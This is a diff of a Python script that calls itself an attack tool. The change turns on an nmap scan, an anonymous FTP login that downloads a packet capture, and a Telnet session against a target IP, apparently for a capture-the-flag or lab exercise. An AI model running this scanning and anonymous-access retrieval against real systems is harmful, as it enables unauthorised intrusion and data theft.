@@ -4,7 +4,6 @@ import time
 import socket
 from ftplib import FTP  
 from telnetlib import Telnet
-from pwn import *
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import subprocess
 
@@ -22,22 +21,22 @@ print("Attacking "+target_ip+" from my own ip: "+own_ip)
 
 
 # #############  NMAP  #############
-# os.system("nmap -sC -sV "+target_ip)
-# time.sleep(20)
+os.system("nmap -sC -sV "+target_ip)
+time.sleep(20)
 
-# #############  FTP  #############
-# ftp = FTP(target_ip)
-# ftp.login()
-# time.sleep(1)
-# ftp.retrlines('LIST')
-# time.sleep(2)
-# try:
-#     with open('capture.pcapng', 'wb') as fp:
-#         ftp.retrbinary('RETR captasure.pcapng', fp.write)
-#         downloaded = True
-# except:
-#     downloaded = False
-# ftp.quit()
+#############  FTP  #############
+ftp = FTP(target_ip)
+ftp.login()
+time.sleep(1)
+ftp.retrlines('LIST')
+time.sleep(2)
+try:
+    with open('capture.pcapng', 'wb') as fp:
+        ftp.retrbinary('RETR captasure.pcapng', fp.write)
+        downloaded = True
+except:
+    downloaded = False
+ftp.quit()
 
 
 with Telnet(target_ip, 23) as tn:
@@ -66,17 +65,3 @@ with Telnet(target_ip, 23) as tn:
     print(tn.read_all())
 
     
-    
-    # print(answer)
-    # time.sleep(2)
-    # print("sending anonymous")
-    # conn.sendline(b'user anonymous')
-    # time.sleep(1)
-    # answer = conn.recv()
-    # # print("sending pass")
-    # # conn.sendline(b'pass')
-    # # time.sleep(1)
-    # # print("sending ls")
-    # # conn.sendline(b'ls')
-    # # answer = conn.recv()
-    # print(answer)
